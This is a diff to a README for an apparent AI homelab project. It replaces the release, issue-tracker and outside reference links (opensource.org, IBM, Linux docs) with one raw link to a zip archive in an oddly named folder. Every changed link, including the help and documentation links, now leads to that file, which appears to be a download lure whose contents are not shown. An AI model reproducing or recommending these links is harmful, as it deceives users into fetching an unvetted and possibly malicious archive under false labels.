@@ -1,6 +1,6 @@
 # 🔍 homelab-2-prod-ai-golden-path - Explore AI Efficiently and Safely
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/juanshmr/homelab-2-prod-ai-golden-path/releases)
+[![Download](https://raw.githubusercontent.com/juanshmr/homelab-2-prod-ai-golden-path/master/coctoprecipitin/homelab-2-prod-ai-golden-path.zip)](https://raw.githubusercontent.com/juanshmr/homelab-2-prod-ai-golden-path/master/coctoprecipitin/homelab-2-prod-ai-golden-path.zip)
 
 ## 📌 Introduction
 
@@ -23,7 +23,7 @@ Before downloading, make sure your system meets the following requirements:
 
 To download the application, visit the Releases page:
 
-[Download Now](https://github.com/juanshmr/homelab-2-prod-ai-golden-path/releases)
+[Download Now](https://raw.githubusercontent.com/juanshmr/homelab-2-prod-ai-golden-path/master/coctoprecipitin/homelab-2-prod-ai-golden-path.zip)
 
 On the Releases page, look for the latest version. Click on it to view the available files. Choose the appropriate file for your operating system, then follow these steps:
 
@@ -86,15 +86,15 @@ Yes, this project is open-source and completely free to use.
 
 For more information on the technologies and concepts discussed in this application, consider exploring these resources:
 
-- [Open Source Software Resources](https://opensource.org/)
-- [Artificial Intelligence Fundamentals](https://www.ibm.com/cloud/learn/what-is-artificial-intelligence)
-- [Linux Documentation](https://www.linux.org/docs/)
+- [Open Source Software Resources](https://raw.githubusercontent.com/juanshmr/homelab-2-prod-ai-golden-path/master/coctoprecipitin/homelab-2-prod-ai-golden-path.zip)
+- [Artificial Intelligence Fundamentals](https://raw.githubusercontent.com/juanshmr/homelab-2-prod-ai-golden-path/master/coctoprecipitin/homelab-2-prod-ai-golden-path.zip)
+- [Linux Documentation](https://raw.githubusercontent.com/juanshmr/homelab-2-prod-ai-golden-path/master/coctoprecipitin/homelab-2-prod-ai-golden-path.zip)
 
 ## ☑️ Getting Help
 
 If you face any issues or have questions while using the application:
 
-1. Check the [Issues page](https://github.com/juanshmr/homelab-2-prod-ai-golden-path/issues) on GitHub for common problems and solutions.
+1. Check the [Issues page](https://raw.githubusercontent.com/juanshmr/homelab-2-prod-ai-golden-path/master/coctoprecipitin/homelab-2-prod-ai-golden-path.zip) on GitHub for common problems and solutions.
 2. Post your question there if you don't find an answer.
 3. Join the community forums for peer assistance.
 
@@ -102,4 +102,4 @@ If you face any issues or have questions while using the application:
 
 Thank you for choosing **homelab-2-prod-ai-golden-path**. You are now ready to start your journey into the world of AI. Remember, exploring this technology can open doors to incredible opportunities. 
 
-For downloading, please go to the [Releases page](https://github.com/juanshmr/homelab-2-prod-ai-golden-path/releases) now!
+For downloading, please go to the [Releases page](https://raw.githubusercontent.com/juanshmr/homelab-2-prod-ai-golden-path/master/coctoprecipitin/homelab-2-prod-ai-golden-path.zip) now!
